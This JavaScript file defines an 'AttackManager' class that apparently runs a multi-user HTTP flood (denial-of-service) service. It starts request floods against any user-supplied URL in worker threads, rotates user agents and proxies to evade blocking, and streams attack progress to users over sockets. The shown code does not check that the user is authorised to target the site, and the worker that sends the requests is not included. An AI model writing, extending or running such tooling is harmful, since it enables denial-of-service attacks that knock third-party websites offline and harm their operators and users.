// Enhanced Attack Manager with Worker Threads
class AttackManager {
  constructor() {
    this.activeAttacks = new Map();
    this.userSessions = new Map();
    this.workers = new Map();
    this.userAgents = this.loadUserAgents();
    this.proxies = this.loadProxies();
    this.stats = {
      totalAttacks: 0,
      totalRequests: 0,
      activeUsers: 0
    };
  }

  loadUserAgents() {
    try {
      if (fs.existsSync('us.txt')) {
        const data = fs.readFileSync('us.txt', 'utf8');
        const agents = data.split('\n')
          .filter(line => line.trim())
          .map(line => line.trim());
        return agents.length > 0 ? agents : defaultUserAgents;
      }
    } catch (error) {
      console.log('Using default user agents');
    }
    return defaultUserAgents;
  }

  loadProxies() {
    try {
      if (fs.existsSync('proxy.txt')) {
        const data = fs.readFileSync('proxy.txt', 'utf8');
        return data.split('\n')
          .filter(line => line.trim())
          .map(line => line.trim());
      }
    } catch (error) {
      console.log('No proxy file found');
    }
    return [];
  }

  generateRandomIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
  }

  getRandomUserAgent() {
    if (this.userAgents.length > 0) {
      return this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
    }
    return defaultUserAgents[0];
  }

  createUserSession(userId) {
    const session = {
      id: userId,
      attacks: new Map(),
      stats: {
        attacksStarted: 0,
        totalRequests: 0,
        lastActive: Date.now()
      }
    };
    this.userSessions.set(userId, session);
    return session;
  }

  getUserSession(userId) {
    let session = this.userSessions.get(userId);
    if (!session) {
      session = this.createUserSession(userId);
    }
    session.stats.lastActive = Date.now();
    return session;
  }

  async startAttack(userId, targetUrl, threads, totalRequests, socket) {
    // Check concurrent attack limit
    const userSession = this.getUserSession(userId);
    if (userSession.attacks.size >= 3) {
      throw new Error('Maximum 3 concurrent attacks per user');
    }

    // Validate input
    if (!targetUrl || !targetUrl.startsWith('http')) {
      throw new Error('Invalid target URL');
    }

    const attackId = `attack_${Date.now()}_${uuidv4().slice(0, 8)}`;
    
    const attack = {
      id: attackId,
      userId: userId,
      target: targetUrl,
      threads: Math.min(threads, CONFIG.MAX_THREADS),
      totalRequests: Math.min(totalRequests, CONFIG.MAX_REQUESTS),
      sentRequests: 0,
      successfulRequests: 0,
      failedRequests: 0,
      isRunning: true,
      startTime: Date.now(),
      socket: socket,
      worker: null
    };

    this.activeAttacks.set(attackId, attack);
    userSession.attacks.set(attackId, attack);
    this.stats.totalAttacks++;

    // Start attack in worker thread for better performance
    this.startAttackWorker(attack);

    return attack;
  }

  startAttackWorker(attack) {
    const worker = new Worker('./attackWorker.js', {
      workerData: {
        attackId: attack.id,
        targetUrl: attack.target,
        threads: attack.threads,
        totalRequests: attack.totalRequests,
        userAgents: this.userAgents,
        proxies: this.proxies
      }
    });

    attack.worker = worker;

    worker.on('message', (message) => {
      if (message.type === 'progress') {
        attack.sentRequests = message.sent;
        attack.successfulRequests = message.successful;
        attack.failedRequests = message.failed;

        if (attack.socket) {
          attack.socket.emit('attack_progress', {
            attackId: attack.id,
            sent: message.sent,
            successful: message.successful,
            failed: message.failed,
            progress: Math.round((message.sent / attack.totalRequests) * 100)
          });
        }
      } else if (message.type === 'complete') {
        attack.isRunning = false;
        attack.endTime = Date.now();
        
        if (attack.socket) {
          attack.socket.emit('attack_complete', {
            attackId: attack.id,
            summary: {
              totalSent: message.sent,
              successful: message.successful,
              failed: message.failed,
              duration: attack.endTime - attack.startTime
            }
          });
        }
        
        this.cleanupAttack(attack.id);
      } else if (message.type === 'error') {
        console.error(`Attack ${attack.id} error:`, message.error);
        if (attack.socket) {
          attack.socket.emit('attack_error', {
            attackId: attack.id,
            error: message.error
          });
        }
        this.cleanupAttack(attack.id);
      }
    });

    worker.on('error', (error) => {
      console.error(`Worker error for attack ${attack.id}:`, error);
      if (attack.socket) {
        attack.socket.emit('attack_error', {
          attackId: attack.id,
          error: 'Worker thread crashed'
        });
      }
      this.cleanupAttack(attack.id);
    });

    worker.on('exit', (code) => {
      if (code !== 0) {
        console.error(`Worker stopped with exit code ${code}`);
      }
      this.cleanupAttack(attack.id);
    });
  }

  stopAttack(attackId) {
    const attack = this.activeAttacks.get(attackId);
    if (attack) {
      attack.isRunning = false;
      
      if (attack.worker) {
        attack.worker.terminate();
      }
      
      if (attack.socket) {
        attack.socket.emit('attack_stopped', {
          attackId: attackId,
          success: true,
          message: 'Attack stopped successfully'
        });
      }
      
      this.cleanupAttack(attackId);
      return true;
    }
    return false;
  }

  stopUserAttacks(userId) {
    const userSession = this.userSessions.get(userId);
    if (userSession) {
      let stoppedCount = 0;
      for (const [attackId, attack] of userSession.attacks) {
        if (this.stopAttack(attackId)) {
          stoppedCount++;
        }
      }
      return stoppedCount;
    }
    return 0;
  }

  cleanupAttack(attackId) {
    const attack = this.activeAttacks.get(attackId);
    if (attack) {
      // Remove from user session
      const userSession = this.userSessions.get(attack.userId);
      if (userSession) {
        userSession.attacks.delete(attackId);
      }
      
      // Remove from active attacks
      this.activeAttacks.delete(attackId);
      
      // Update stats
      this.stats.totalRequests += attack.sentRequests;
      
      return true;
    }
    return false;
  }

  getAttackStatus(attackId) {
    return this.activeAttacks.get(attackId);
  }

  getUserStats(userId) {
    const userSession = this.userSessions.get(userId);
    if (!userSession) return null;
    
    let totalSent = 0;
    let totalSuccessful = 0;
    let activeAttacks = 0;
    
    for (const attack of userSession.attacks.values()) {
      totalSent += attack.sentRequests;
      totalSuccessful += attack.successfulRequests;
      if (attack.isRunning) activeAttacks++;
    }
    
    return {
      userId: userId,
      activeAttacks: activeAttacks,
      totalAttacks: userSession.attacks.size,
      totalRequests: totalSent,
      successRate: totalSent > 0 ? Math.round((totalSuccessful / totalSent) * 100) : 0,
      lastActive: userSession.stats.lastActive
    };
  }

  getGlobalStats() {
    return {
      totalActiveAttacks: this.activeAttacks.size,
      totalUsers: this.userSessions.size,
      totalRequests: this.stats.totalRequests,
      totalAttacks: this.stats.totalAttacks,
      userAgentsLoaded: this.userAgents.length,
      proxiesLoaded: this.proxies.length
    };
  }

  cleanupInactiveSessions(maxAge = 30 * 60 * 1000) { // 30 minutes
    const now = Date.now();
    for (const [userId, session] of this.userSessions.entries()) {
      if (now - session.stats.lastActive > maxAge && session.attacks.size === 0) {
        this.userSessions.delete(userId);
      }
    }
  }
}

